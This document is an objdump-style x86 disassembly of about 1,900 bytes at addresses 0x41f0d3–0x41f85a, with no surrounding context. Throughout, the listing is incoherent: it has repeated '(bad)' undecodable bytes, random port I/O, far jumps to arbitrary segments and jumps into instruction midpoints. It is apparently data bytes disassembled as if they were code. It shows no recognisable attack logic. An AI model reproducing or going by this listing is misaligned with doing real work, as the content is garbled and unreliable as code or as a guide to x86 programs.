  41f0d3:	and    eax,0xbbf40149
  41f0d8:	dec    eax
  41f0d9:	les    edx,FWORD PTR [edx-0x2910d306]
  41f0df:	dec    esi
  41f0e0:	xchg   BYTE PTR [esp+eax*1],dh
  41f0e3:	and    eax,0x549054ad
  41f0e8:	sub    BYTE PTR [ebx],al
  41f0ea:	out    dx,al
  41f0eb:	jg     0x41f093
  41f0ed:	mov    WORD PTR [ebp+0x7],gs
  41f0f0:	jl     0x41f11c
  41f0f2:	mov    edx,0x3e1f943e
  41f0f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0f8:	idiv   DWORD PTR [esi]
  41f0fa:	cmp    al,BYTE PTR [edi+0x17c010bd]
  41f100:	(bad)  
  41f101:	out    dx,al
  41f102:	push   eax
  41f103:	or     DWORD PTR [edi],ebx
  41f105:	int3   
  41f106:	scas   eax,DWORD PTR es:[edi]
  41f107:	das    
  41f108:	pop    ecx
  41f109:	pop    ebx
  41f10a:	or     DWORD PTR [edx],ecx
  41f10c:	icebp  
  41f10d:	xchg   ecx,eax
  41f10e:	cmp    BYTE PTR [ecx+0x13],0x2a
  41f112:	xor    al,0xfc
  41f114:	fiadd  WORD PTR [esi+0x33]
  41f117:	push   es
  41f118:	push   0x48
  41f11a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f11b:	xchg   ebp,eax
  41f11c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f11d:	dec    eax
  41f11e:	out    dx,al
  41f11f:	dec    ebx
  41f120:	and    BYTE PTR ds:[eax+0x51],al
  41f124:	push   edx
  41f125:	mov    ch,0x6c
  41f127:	loope  0x41f10f
  41f129:	cld    
  41f12a:	call   0x30b6:0x31004b29
  41f131:	popa   
  41f132:	daa    
  41f133:	aaa    
  41f134:	out    dx,eax
  41f135:	leave  
  41f136:	pop    es
  41f137:	and    eax,0x1b0a2b88
  41f13c:	mov    ds:0x18a2ea41,eax
  41f141:	xor    al,0x27
  41f143:	mov    eax,0x154fe91f
  41f148:	int3   
  41f149:	add    eax,0x47bf6a3e
  41f14e:	push   0x7f8236ec
  41f153:	jae    0x41f188
  41f155:	jae    0x41f0e9
  41f157:	or     al,0xdb
  41f159:	jle    0x41f172
  41f15b:	mov    DWORD PTR [esi+0x29fbb892],ebx
  41f161:	adc    al,0x70
  41f163:	nop
  41f164:	fidivr DWORD PTR [eax-0x14]
  41f167:	mov    ah,0x84
  41f169:	push   ebp
  41f16a:	mov    edx,0x8aace43c
  41f16f:	push   es
  41f170:	push   ebx
  41f171:	push   0x65
  41f173:	xchg   ebp,edi
  41f175:	lahf   
  41f176:	and    esp,DWORD PTR [eax+0x4c1b9863]
  41f17c:	into   
  41f17d:	in     al,dx
  41f17e:	loope  0x41f172
  41f180:	xor    BYTE PTR cs:[ebp-0x33e3b064],al
  41f187:	pop    ss
  41f188:	lahf   
  41f189:	inc    ebp
  41f18a:	stc    
  41f18b:	mov    al,0xbd
  41f18d:	lea    esp,es:[edx+0x5b41e2c6]
  41f194:	dec    ebp
  41f195:	fsubr  QWORD PTR [edx]
  41f197:	int3   
  41f198:	div    DWORD PTR [ecx]
  41f19a:	push   ecx
  41f19b:	inc    esp
  41f19c:	shl    cl,cl
  41f19e:	(bad)  
  41f19f:	cmp    al,0x8d
  41f1a1:	inc    edx
  41f1a2:	jmp    0x41f1cc
  41f1a4:	cwde   
  41f1a5:	mov    cl,0x7d
  41f1a7:	or     cl,BYTE PTR [edi+0x70]
  41f1aa:	inc    ebx
  41f1ab:	cld    
  41f1ac:	loopne 0x41f18a
  41f1ae:	es mov ecx,esp
  41f1b1:	js     0x41f161
  41f1b3:	adc    edi,DWORD PTR [ecx-0x68b242a6]
  41f1b9:	mov    ecx,edi
  41f1bb:	inc    edi
  41f1bc:	xor    ch,BYTE PTR [esi+0x117c5bbc]
  41f1c2:	cmc    
  41f1c3:	push   0xf11fcf71
  41f1c8:	push   edx
  41f1c9:	dec    esp
  41f1ca:	cli    
  41f1cb:	test   edx,ecx
  41f1cd:	push   edi
  41f1ce:	jmp    0xe0f8:0xcca0efbd
  41f1d5:	ficom  WORD PTR cs:[edx+esi*1]
  41f1d9:	push   esp
  41f1da:	push   ebp
  41f1db:	int3   
  41f1dc:	(bad)  
  41f1de:	inc    esp
  41f1df:	cmp    eax,0xec7688f0
  41f1e4:	push   edi
  41f1e5:	retf   
  41f1e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1e7:	push   edx
  41f1e8:	sahf   
  41f1e9:	jb     0x41f16f
  41f1eb:	jmp    0x41f20e
  41f1ed:	sbb    BYTE PTR [ecx],dl
  41f1ef:	ror    DWORD PTR [edx+0x39a7424c],1
  41f1f5:	xor    ebp,DWORD PTR [esi-0x57]
  41f1f8:	iret   
  41f1f9:	xlat   BYTE PTR ds:[ebx]
  41f1fa:	xchg   eax,edi
  41f1fc:	test   eax,0x41568744
  41f201:	inc    ebx
  41f202:	mov    al,ds:0x76b1cef2
  41f207:	pop    ebx
  41f208:	add    eax,0x9b2db8ea
  41f20d:	pop    ds
  41f20e:	xchg   DWORD PTR [ebx+0x56e36391],ebx
  41f214:	out    0x88,al
  41f216:	mov    eax,0xa506f120
  41f21b:	in     al,0xfd
  41f21d:	adc    bh,al
  41f21f:	lock mov ds:0x594fb8a0,al
  41f225:	dec    esi
  41f226:	or     dh,BYTE PTR [ebx]
  41f228:	xchg   BYTE PTR [ecx+0x2ba74a35],dl
  41f22e:	mov    edi,0x4143ca8b
  41f233:	cmc    
  41f234:	pop    ss
  41f235:	stos   BYTE PTR es:[edi],al
  41f236:	sahf   
  41f237:	es jmp 0x26ba:0xe503556
  41f23f:	xchg   ebx,eax
  41f240:	(bad)  
  41f241:	retf   0x9aec
  41f244:	jae    0xbabf9679
  41f24a:	xchg   ebx,eax
  41f24b:	jge    0x41f1da
  41f24d:	dec    edx
  41f24e:	in     eax,dx
  41f24f:	stc    
  41f250:	jmp    0x30be7dbf
  41f255:	dec    esp
  41f256:	fmul   DWORD PTR [ebx+edx*2]
  41f259:	outs   dx,DWORD PTR ds:[esi]
  41f25a:	jg     0x41f2d5
  41f25c:	(bad)  
  41f25d:	push   ecx
  41f25e:	or     al,0x75
  41f260:	adc    ecx,DWORD PTR [ebp-0x67924882]
  41f266:	and    ch,bh
  41f268:	cmp    al,0x4a
  41f26a:	mov    ds:0x5228c72d,al
  41f26f:	xor    eax,0x69c745d0
  41f274:	sahf   
  41f275:	mov    ecx,0x1357ab5b
  41f27a:	inc    ecx
  41f27b:	xchg   ebp,ecx
  41f27d:	adc    BYTE PTR [ecx-0x1333176],ch
  41f283:	test   DWORD PTR [edx+0x3c],eax
  41f286:	(bad)  
  41f287:	dec    ecx
  41f288:	rcl    DWORD PTR [esi+ebp*4+0xf74bdde],1
  41f28f:	xchg   esp,eax
  41f290:	ret    
  41f291:	test   BYTE PTR [ebx+ebp*2-0x4f780978],dh
  41f298:	xchg   ecx,eax
  41f299:	push   es
  41f29a:	add    al,0x6e
  41f29c:	outs   dx,BYTE PTR ds:[esi]
  41f29d:	and    ah,BYTE PTR [ebx]
  41f29f:	cmp    eax,0xfa012fdd
  41f2a4:	cmp    DWORD PTR [ecx],ecx
  41f2a6:	xchg   ecx,eax
  41f2a7:	cld    
  41f2a8:	out    0x9e,eax
  41f2aa:	shl    BYTE PTR ds:0xeca15508,1
  41f2b0:	xchg   BYTE PTR [edx+0x70913911],bl
  41f2b6:	inc    esp
  41f2b7:	outs   dx,DWORD PTR ds:[esi]
  41f2b8:	scas   al,BYTE PTR es:[edi]
  41f2b9:	dec    edi
  41f2ba:	ret    0x3062
  41f2bd:	add    eax,edx
  41f2bf:	mov    dh,0x9e
  41f2c1:	(bad)  
  41f2c2:	loope  0x41f26a
  41f2c4:	fcomip st,st(7)
  41f2c6:	xor    esi,DWORD PTR [ebx-0x37]
  41f2c9:	pusha  
  41f2ca:	jne    0x41f337
  41f2cc:	add    ebx,DWORD PTR [ebx+0x7b4b6f0e]
  41f2d2:	cmp    BYTE PTR [esi+0x638a7854],bl
  41f2d8:	mov    WORD PTR [ebp-0x3c],?
  41f2db:	addr16 mov ah,0xd7
  41f2de:	ret    0x8215
  41f2e1:	ins    BYTE PTR es:[edi],dx
  41f2e2:	imul   edx,ebx,0xffffff94
  41f2e5:	push   ecx
  41f2e6:	inc    ebp
  41f2e7:	mov    esi,ds
  41f2e9:	jmp    0x244a83b0
  41f2ee:	push   es
  41f2ef:	idiv   BYTE PTR [esp+ecx*2-0x6ca6840b]
  41f2f6:	push   edx
  41f2f7:	push   edx
  41f2f8:	in     eax,0x3a
  41f2fa:	sub    DWORD PTR [esi-0x62],esp
  41f2fd:	push   es
  41f2fe:	gs push esp
  41f300:	mov    bl,0x18
  41f302:	ror    BYTE PTR [eax+0x4c],1
  41f305:	cli    
  41f306:	mov    bh,0xd7
  41f308:	gs jmp 0x43bd7f1a
  41f30e:	fild   WORD PTR [ebx+0x1071c383]
  41f314:	jle    0x41f301
  41f316:	adc    eax,DWORD PTR [edx+ebx*8]
  41f319:	imul   esi,DWORD PTR [eax-0x5429d805],0x70e4e1d7
  41f323:	repnz ins DWORD PTR es:[edi],dx
  41f325:	inc    edx
  41f326:	or     cl,dl
  41f328:	pop    ebp
  41f329:	fst    DWORD PTR [ecx+0x3e]
  41f32c:	xor    dl,BYTE PTR [edx-0x50]
  41f32f:	xchg   ebx,eax
  41f330:	or     esi,DWORD PTR [ebx+eax*2+0x3e]
  41f334:	mov    esi,0xa82edc42
  41f339:	(bad)  
  41f33a:	and    BYTE PTR [ebx-0x1fec8a28],ch
  41f340:	fwait
  41f341:	call   0xad34e693
  41f346:	xlat   BYTE PTR ds:[ebx]
  41f347:	mov    esi,0x27a54bb0
  41f34c:	push   esp
  41f34d:	cmp    ecx,ebp
  41f34f:	mov    ch,0x20
  41f351:	aaa    
  41f352:	cmp    BYTE PTR [ecx],0xd3
  41f355:	sub    BYTE PTR [ebx],cl
  41f357:	adc    BYTE PTR [ebx-0x6b],al
  41f35a:	fdivr  st(5),st
  41f35c:	mov    eax,ds:0xe209b97
  41f361:	call   0xe2a1:0x92f21138
  41f368:	adc    DWORD PTR [esi-0x78ca3ff1],0x4b
  41f36f:	ins    DWORD PTR es:[edi],dx
  41f370:	xchg   ch,dh
  41f372:	push   ebx
  41f373:	clc    
  41f374:	jmp    0x69ba7cb
  41f379:	push   esi
  41f37a:	jne    0x41f3bc
  41f37c:	push   ss
  41f37d:	push   0x6e
  41f37f:	and    cl,cl
  41f381:	push   cs
  41f382:	add    BYTE PTR [ecx+0x7623e756],cl
  41f388:	pop    esp
  41f389:	pop    edi
  41f38a:	xlat   BYTE PTR ds:[ebx]
  41f38b:	jp     0x41f329
  41f38d:	sub    BYTE PTR fs:[ecx+0x31],dl
  41f391:	mov    esp,0x5bccee1e
  41f396:	rcr    bh,cl
  41f398:	add    BYTE PTR [edi+0x3952f327],0xe9
  41f39f:	xchg   ecx,eax
  41f3a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3a1:	pusha  
  41f3a2:	fnstenv [edi*4+0x445ccfea]
  41f3a9:	push   ss
  41f3aa:	pop    eax
  41f3ab:	call   FWORD PTR [edi]
  41f3ad:	push   edi
  41f3ae:	dec    ebx
  41f3af:	sub    al,BYTE PTR [edx+0x43]
  41f3b2:	pusha  
  41f3b3:	add    al,0xfe
  41f3b5:	pop    es
  41f3b6:	(bad)  
  41f3b7:	out    dx,al
  41f3b8:	int    0x57
  41f3ba:	test   BYTE PTR [ecx],ch
  41f3bc:	stos   BYTE PTR es:[edi],al
  41f3bd:	mov    cl,dl
  41f3bf:	push   es
  41f3c0:	cli    
  41f3c1:	cwde   
  41f3c2:	sbb    dl,0x79
  41f3c5:	add    BYTE PTR [ecx],ah
  41f3c7:	xchg   edi,eax
  41f3c8:	out    0x3c,al
  41f3ca:	bound  ebx,QWORD PTR [ebx-0x7c]
  41f3cd:	std    
  41f3ce:	pop    edi
  41f3cf:	xor    al,cl
  41f3d1:	or     cl,dh
  41f3d3:	sbb    dl,0xdd
  41f3d6:	xor    eax,0x50127648
  41f3db:	repz or si,sp
  41f3df:	out    0x3c,eax
  41f3e1:	pop    ecx
  41f3e2:	dec    eax
  41f3e3:	or     al,BYTE PTR [edx]
  41f3e5:	xchg   esp,eax
  41f3e6:	lock push es
  41f3e8:	dec    esp
  41f3e9:	mov    ds:0x44d41cf6,eax
  41f3ee:	pusha  
  41f3ef:	(bad)  
  41f3f0:	mov    edx,0xd0879944
  41f3f5:	std    
  41f3f6:	inc    edx
  41f3f7:	mov    ds:0x972a6d74,eax
  41f3fc:	or     al,0xa5
  41f3fe:	ret    0xee46
  41f401:	aaa    
  41f402:	lods   al,BYTE PTR ds:[esi]
  41f403:	or     esp,ebp
  41f405:	fidiv  WORD PTR [ebx-0x50]
  41f408:	jmp    0x41f39b
  41f40a:	mov    ecx,0x743a7e29
  41f40f:	cdq    
  41f410:	mov    esi,0x2e75720a
  41f415:	gs add al,0x2d
  41f418:	push   esp
  41f419:	inc    edx
  41f41a:	(bad)  
  41f41b:	jns    0x41f47b
  41f41d:	pop    es
  41f41e:	or     ebx,DWORD PTR [ecx]
  41f420:	sbb    BYTE PTR [ecx-0x64d59d9d],dl
  41f426:	retf   0x3eff
  41f429:	cmp    al,0x91
  41f42b:	mov    ch,0x72
  41f42d:	popf   
  41f42e:	dec    esp
  41f42f:	gs gs mov dh,0x25
  41f433:	push   esp
  41f434:	aad    0xa4
  41f436:	sub    DWORD PTR [edi-0x7c0ee999],ebp
  41f43c:	aad    0xba
  41f43e:	mov    eax,ds:0xe3a568a9
  41f443:	cmp    BYTE PTR [edi],0xcd
  41f446:	pop    ds
  41f447:	xchg   edi,eax
  41f448:	add    BYTE PTR [eax-0x31],0x8f
  41f44c:	cmp    BYTE PTR [ecx],dl
  41f44e:	adc    BYTE PTR [esi],bl
  41f450:	xor    dl,BYTE PTR [ebx+0x62232573]
  41f456:	dec    edi
  41f457:	xchg   esp,eax
  41f458:	in     eax,0xc5
  41f45a:	inc    edx
  41f45b:	retf   0x1886
  41f45e:	cs mov ah,0xda
  41f461:	or     al,0x41
  41f463:	and    BYTE PTR [eax+0x55],ch
  41f466:	xchg   esi,eax
  41f467:	hlt    
  41f468:	dec    ecx
  41f469:	cmp    DWORD PTR [eax-0x624371a4],ebx
  41f46f:	test   al,0x52
  41f471:	add    esi,esi
  41f473:	call   0x4927b5e7
  41f478:	gs push eax
  41f47a:	inc    ebp
  41f47b:	xor    bh,al
  41f47d:	fcomip st,st(6)
  41f47f:	mov    gs,esp
  41f481:	jl     0x41f49c
  41f483:	and    ah,ch
  41f485:	ins    DWORD PTR es:[edi],dx
  41f486:	xchg   ecx,eax
  41f487:	int    0xd7
  41f489:	pop    esi
  41f48a:	mov    ah,0xe
  41f48c:	aad    0x6
  41f48e:	push   ss
  41f48f:	fsubr  QWORD PTR [esi+ecx*4+0x41]
  41f493:	js     0x41f489
  41f495:	aam    0x13
  41f497:	ds inc ecx
  41f499:	cmovnp esp,esp
  41f49c:	add    DWORD PTR [eax+0x28b10a33],0x1a272d07
  41f4a6:	sahf   
  41f4a7:	int    0x97
  41f4a9:	shl    edx,cl
  41f4ab:	push   edi
  41f4ac:	and    al,bl
  41f4ae:	mov    ch,0x5e
  41f4b0:	pfrcpit2 mm1,QWORD PTR [eax]
  41f4b4:	sub    al,BYTE PTR [ebx]
  41f4b6:	add    eax,0x3e794f5b
  41f4bb:	test   DWORD PTR [edi+0x6e],edx
  41f4be:	pop    es
  41f4bf:	xor    edi,DWORD PTR [eax]
  41f4c1:	cmp    BYTE PTR es:[ebx-0x58620a9c],ah
  41f4c8:	jmp    0x41f4fa
  41f4ca:	mov    DWORD PTR [ebx+0x22],0xaf8bce23
  41f4d1:	inc    esp
  41f4d2:	rcl    edx,cl
  41f4d4:	push   ebx
  41f4d5:	cwde   
  41f4d6:	push   cs
  41f4d7:	iret   
  41f4d8:	adc    ah,BYTE PTR [esi-0x2d]
  41f4db:	pop    ebp
  41f4dc:	inc    ebx
  41f4dd:	mov    eax,ds:0xbd9aeeec
  41f4e2:	aam    0x82
  41f4e4:	fdiv   QWORD PTR [edi-0x55]
  41f4e7:	push   ds
  41f4e8:	mov    edi,0xaa2c165d
  41f4ed:	out    dx,al
  41f4ee:	push   esi
  41f4ef:	pop    ebp
  41f4f0:	mov    WORD PTR [ecx+0x7f],es
  41f4f3:	adc    ch,BYTE PTR [ebp+0x65]
  41f4f6:	or     eax,0xf35235e6
  41f4fb:	std    
  41f4fc:	jae    0xb892edc4
  41f502:	mov    dl,0x81
  41f504:	push   esp
  41f505:	add    BYTE PTR [esi],dl
  41f507:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f508:	sub    al,0x99
  41f50a:	cmp    al,0xf8
  41f50c:	mov    edx,0xce0ae4ec
  41f511:	jge    0x41f52e
  41f513:	add    dl,BYTE PTR [ecx+0x2168bd11]
  41f519:	pop    eax
  41f51a:	mov    al,ds:0x24db49fa
  41f51f:	sbb    dl,BYTE PTR [ebx-0x4e]
  41f522:	dec    ebx
  41f523:	and    al,BYTE PTR [esi+edx*4]
  41f526:	xchg   esi,eax
  41f527:	repnz fsub QWORD PTR [ebp+0x42f79938]
  41f52e:	lods   eax,DWORD PTR ds:[esi]
  41f52f:	test   esp,0x68d72885
  41f535:	je     0x41f5b6
  41f537:	jle    0x41f583
  41f539:	and    eax,DWORD PTR [ebx+0x6d]
  41f53c:	data16 out dx,al
  41f53e:	bound  edi,QWORD PTR [eax+0x1b52ce53]
  41f544:	cld    
  41f545:	xchg   edx,eax
  41f546:	outs   dx,DWORD PTR ds:[si]
  41f548:	jmp    0xff49:0xa78ea6bf
  41f54f:	push   edi
  41f550:	pop    ss
  41f551:	or     BYTE PTR [edi+eax*1+0x3],ah
  41f555:	add    BYTE PTR [edx+0x23eabb27],cl
  41f55b:	xchg   edi,eax
  41f55c:	aam    0xa2
  41f55e:	dec    ebx
  41f55f:	mov    al,ds:0xfb8165a2
  41f564:	fisttp QWORD PTR [eax]
  41f566:	mov    edx,edi
  41f568:	cmc    
  41f569:	push   edx
  41f56a:	(bad)  
  41f56b:	loope  0x41f574
  41f56d:	ret    0x5623
  41f570:	mov    esp,0x70a771ad
  41f575:	cwde   
  41f576:	inc    edx
  41f577:	ja     0x41f5f2
  41f579:	ud2    
  41f57b:	loopne 0x41f5f8
  41f57d:	stos   BYTE PTR es:[edi],al
  41f57e:	call   0xbf154daf
  41f583:	in     eax,dx
  41f584:	retf   0xf026
  41f587:	cmp    dl,0x4f
  41f58a:	dec    esi
  41f58b:	adc    dl,BYTE PTR [esi-0x7b]
  41f58e:	sub    dh,ch
  41f590:	pop    esp
  41f591:	out    0x40,eax
  41f593:	jb     0x41f604
  41f595:	jmp    0x41f60f
  41f597:	lods   al,BYTE PTR ds:[esi]
  41f598:	pop    edx
  41f599:	fadd   st(2),st
  41f59b:	xchg   ebx,eax
  41f59c:	and    bl,BYTE PTR [edi]
  41f59e:	dec    esp
  41f59f:	js     0x41f526
  41f5a1:	int    0xf6
  41f5a3:	ror    al,cl
  41f5a5:	jmp    0x3f8d:0xf28ac629
  41f5ac:	and    al,0xec
  41f5ae:	mov    cl,0x8f
  41f5b0:	aam    0xa9
  41f5b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f5b3:	repnz dec ebx
  41f5b5:	add    al,0x24
  41f5b7:	lods   eax,DWORD PTR ds:[esi]
  41f5b8:	enter  0xd3e8,0x61
  41f5bc:	ja     0x41f5d7
  41f5be:	arpl   WORD PTR [edi+edi*4-0xa2eac04],ax
  41f5c5:	xchg   esp,eax
  41f5c6:	jp     0x41f587
  41f5c8:	pop    esi
  41f5c9:	xchg   BYTE PTR ds:0xe073c89a,bh
  41f5cf:	cmp    edx,esp
  41f5d1:	sub    dh,BYTE PTR [edx-0x6e]
  41f5d4:	mov    ch,0x73
  41f5d6:	cmp    edx,DWORD PTR [ecx+0x36]
  41f5d9:	mov    eax,ss
  41f5db:	sahf   
  41f5dc:	fistp  WORD PTR [edi-0x3a]
  41f5df:	lock inc ebp
  41f5e1:	pop    esi
  41f5e2:	stos   BYTE PTR es:[edi],al
  41f5e3:	dec    ebx
  41f5e4:	(bad)  
  41f5e5:	mov    ebx,0xee08c57f
  41f5ea:	mov    WORD PTR [edi],?
  41f5ec:	adc    BYTE PTR [esi+ebx*1+0x3f],bh
  41f5f0:	pop    ds
  41f5f1:	lods   eax,DWORD PTR ds:[esi]
  41f5f2:	loope  0x41f64f
  41f5f4:	sbb    BYTE PTR ss:[eax+edx*2],al
  41f5f8:	pop    ss
  41f5f9:	jb     0x41f610
  41f5fb:	cmc    
  41f5fc:	outs   dx,DWORD PTR ds:[esi]
  41f5fd:	lds    esp,FWORD PTR [ecx+edx*4-0xca6d50c]
  41f604:	enter  0x1bd1,0xbb
  41f608:	outs   dx,DWORD PTR ds:[esi]
  41f609:	xchg   BYTE PTR [edi-0x19],ah
  41f60c:	stos   DWORD PTR es:[edi],eax
  41f60d:	mov    ah,BYTE PTR [ebp+0x2067d5be]
  41f613:	xor    al,0x2d
  41f615:	ss ret 
  41f617:	or     DWORD PTR [edi-0x4c32b5a8],eax
  41f61d:	xor    ebx,DWORD PTR [edi]
  41f61f:	test   eax,0xc0ee2d45
  41f624:	std    
  41f625:	pop    esi
  41f626:	cs fld TBYTE PTR fs:[eax-0x7a]
  41f62b:	(bad)  
  41f62c:	enter  0x6b74,0x59
  41f630:	xchg   ebx,eax
  41f631:	hlt    
  41f632:	in     al,0xc3
  41f634:	(bad)  
  41f635:	popa   
  41f636:	out    dx,al
  41f637:	pop    es
  41f638:	cld    
  41f639:	cwde   
  41f63a:	into   
  41f63b:	jmp    0xa60b:0x23cb890f
  41f642:	sbb    DWORD PTR [ebx+0x79],ecx
  41f645:	les    eax,FWORD PTR [edx+0x168bd62]
  41f64b:	xchg   edi,eax
  41f64c:	pop    edx
  41f64d:	sbb    eax,0x23c69836
  41f652:	xchg   ebx,eax
  41f653:	ror    BYTE PTR [ecx+0x753b8127],0x85
  41f65a:	fsubrp st(6),st
  41f65c:	cmc    
  41f65d:	xchg   ebp,eax
  41f65e:	add    al,0x18
  41f660:	push   0xffffff9c
  41f662:	(bad)  
  41f663:	data16 loope 0x41f625
  41f666:	retf   0x9877
  41f669:	dec    eax
  41f66a:	repnz adc DWORD PTR [edi],edi
  41f66d:	rol    BYTE PTR [ebx],1
  41f66f:	retf   
  41f670:	es pop eax
  41f672:	jge    0x41f65b
  41f674:	xchg   edx,eax
  41f675:	jmp    0x41f6ad
  41f677:	les    eax,FWORD PTR [ecx-0x7742adf5]
  41f67d:	push   ss
  41f67e:	stos   BYTE PTR es:[edi],al
  41f67f:	dec    edx
  41f680:	pusha  
  41f681:	lock loope 0x41f6ba
  41f684:	mov    eax,esp
  41f686:	mov    dh,0xc6
  41f688:	int3   
  41f689:	sub    dh,al
  41f68b:	add    BYTE PTR [edi-0x5dbb7a0e],ah
  41f691:	jp     0x41f70e
  41f693:	mov    esi,0xb153749
  41f698:	sub    dh,ch
  41f69a:	inc    edx
  41f69b:	pop    esi
  41f69c:	adc    eax,edx
  41f69e:	dec    ebx
  41f69f:	stc    
  41f6a0:	test   DWORD PTR [ebp-0x70],eax
  41f6a3:	pop    es
  41f6a4:	mov    edx,0x19800564
  41f6a9:	sbb    ebx,DWORD PTR [edx-0x4c]
  41f6ac:	push   0xffffffc3
  41f6ae:	mov    dl,0xef
  41f6b0:	pop    edx
  41f6b1:	in     al,dx
  41f6b2:	push   0x78
  41f6b4:	jp     0x41f684
  41f6b6:	adc    dh,BYTE PTR [eax+eax*8-0x7c]
  41f6ba:	cmc    
  41f6bb:	shl    dh,0xc6
  41f6be:	pop    ds
  41f6bf:	leave  
  41f6c0:	cld    
  41f6c1:	xor    eax,0x7c1b536d
  41f6c6:	sti    
  41f6c7:	les    ebx,FWORD PTR [ebp+0x7c]
  41f6ca:	gs call 0x7ef:0xe1330ba4
  41f6d2:	loope  0x41f6b6
  41f6d4:	or     al,0x27
  41f6d6:	adc    dl,cl
  41f6d8:	and    BYTE PTR [eax+0x1d2f415f],bh
  41f6de:	js     0x41f6e8
  41f6e0:	test   al,0x8b
  41f6e2:	cmp    eax,0xc586d7f2
  41f6e7:	sbb    eax,0xa006de66
  41f6ec:	aad    0x12
  41f6ee:	pop    bp
  41f6f0:	arpl   WORD PTR [esp+ebx*8-0x4d],si
  41f6f4:	and    esp,esp
  41f6f6:	jmp    0x1d0d:0xff0ea797
  41f6fd:	in     al,0xd7
  41f6ff:	lods   al,BYTE PTR ds:[esi]
  41f700:	mov    DWORD PTR [ebx],0xf57bee8e
  41f706:	lods   eax,DWORD PTR ds:[esi]
  41f707:	ror    DWORD PTR [ebx+edx*4+0x776e504a],1
  41f70e:	inc    eax
  41f70f:	pop    ebp
  41f710:	aad    0x55
  41f712:	clc    
  41f713:	lods   eax,DWORD PTR ds:[esi]
  41f714:	dec    edi
  41f715:	outs   dx,BYTE PTR ds:[esi]
  41f716:	lea    esi,[edx]
  41f718:	pop    esp
  41f719:	mov    esi,?
  41f71b:	dec    ebp
  41f71c:	sub    edx,ebp
  41f71e:	ds std 
  41f720:	dec    BYTE PTR [ebp-0x700f9e45]
  41f726:	cmp    bl,BYTE PTR [esi-0x32]
  41f729:	hlt    
  41f72a:	addr16 in eax,0xf7
  41f72d:	xchg   DWORD PTR [edx+edi*8],edx
  41f730:	xchg   edx,eax
  41f731:	cld    
  41f732:	xchg   edi,eax
  41f733:	mov    ?,WORD PTR [eax-0x4fa8db55]
  41f739:	and    DWORD PTR [ebp-0x1284ae2],esp
  41f73f:	out    0xfa,eax
  41f741:	push   cs
  41f742:	adc    dh,BYTE PTR [esi-0x3076a911]
  41f748:	mov    ebp,0xcc35fc3c
  41f74d:	ja     0x41f6f2
  41f74f:	or     bh,bh
  41f751:	in     al,dx
  41f752:	and    eax,0x1c7bfb54
  41f757:	sbb    eax,0xf2c04fdd
  41f75c:	mov    esi,0xcf70fee
  41f761:	popf   
  41f762:	mov    dh,dl
  41f764:	sbb    bh,cl
  41f766:	dec    esi
  41f767:	add    al,0xb6
  41f769:	aam    0x92
  41f76b:	gs stos DWORD PTR es:[edi],eax
  41f76d:	pop    ecx
  41f76e:	addr16 jae 0x41f7d0
  41f771:	xchg   DWORD PTR [ecx+0x29d53a1e],esp
  41f777:	iret   
  41f778:	and    eax,0xad106ffa
  41f77d:	out    0x5f,al
  41f77f:	arpl   WORD PTR [esi+ebp*4+0x4e206b47],ax
  41f786:	call   0x5507:0x19d3a7f6
  41f78d:	pop    ebp
  41f78e:	jg     0x41f7e3
  41f790:	dec    DWORD PTR [ebp+0x54f4b97d]
  41f796:	int    0x2a
  41f798:	and    DWORD PTR [ecx],esi
  41f79a:	stos   BYTE PTR es:[edi],al
  41f79b:	and    BYTE PTR [edx-0x4919713d],bh
  41f7a1:	mov    ah,0xe0
  41f7a3:	call   0x37ab0bf
  41f7a8:	adc    BYTE PTR [ecx],0xdf
  41f7ab:	sub    eax,ebp
  41f7ad:	ds aam 0xf3
  41f7b0:	cmovne esp,DWORD PTR [ecx]
  41f7b3:	add    al,0x9f
  41f7b5:	test   DWORD PTR [edx],0x4ee1eceb
  41f7bb:	inc    edx
  41f7bc:	addr16 ja 0x41f7d8
  41f7bf:	mov    esp,0xe85ece12
  41f7c4:	xor    eax,0x6dda960f
  41f7c9:	cs ins DWORD PTR es:[edi],dx
  41f7cb:	mov    ecx,0xbd9ab103
  41f7d0:	sbb    dh,BYTE PTR [esi-0x35d183f8]
  41f7d6:	daa    
  41f7d7:	mov    edx,0x8ecad7e0
  41f7dc:	xor    DWORD PTR [esi],ebx
  41f7de:	mov    ebx,0xaba30192
  41f7e3:	cmp    BYTE PTR [esi],bh
  41f7e5:	std    
  41f7e6:	test   dl,ah
  41f7e8:	cmp    al,0xd
  41f7ea:	ds push es
  41f7ec:	push   edi
  41f7ed:	cmp    dh,dh
  41f7ef:	cdq    
  41f7f0:	mov    eax,ds:0x2f92ba14
  41f7f5:	ins    BYTE PTR es:[edi],dx
  41f7f6:	and    BYTE PTR [eax],bl
  41f7f8:	test   al,0x1c
  41f7fa:	pop    ss
  41f7fb:	add    eax,0x3ad26ff7
  41f800:	mov    eax,0xd6492251
  41f805:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f806:	add    al,0x1f
  41f808:	jae    0x41f7bc
  41f80a:	pop    ecx
  41f80b:	xor    edi,DWORD PTR [esp+edi*8+0x4b7012da]
  41f812:	mov    ds:0x9e6bc029,eax
  41f817:	jno    0x41f7fc
  41f819:	push   0x6d
  41f81b:	dec    edi
  41f81c:	jno    0x41f7b2
  41f81e:	dec    esp
  41f81f:	pop    ebp
  41f820:	sub    esp,eax
  41f822:	cmp    bl,ah
  41f824:	mov    eax,0x706d113b
  41f829:	mov    ecx,0xd3711537
  41f82e:	das    
  41f82f:	adc    al,0xfb
  41f831:	xor    BYTE PTR [edx],0xf
  41f834:	arpl   WORD PTR [ebx+0x7061749],di
  41f83a:	dec    edi
  41f83b:	fisttp WORD PTR [edx]
  41f83d:	cmp    eax,0xab6adcbd
  41f842:	pop    es
  41f843:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f844:	sub    BYTE PTR [ebx+0x3b],ch
  41f847:	stos   DWORD PTR es:[edi],eax
  41f848:	adc    bl,dh
  41f84a:	dec    esp
  41f84b:	or     WORD PTR [edi-0x26],0x3876
  41f851:	stc    
  41f852:	or     eax,0x1af976e9
  41f857:	fwait
  41f858:	nop
  41f859:	int3   
  41f85a:	and    al,0x99
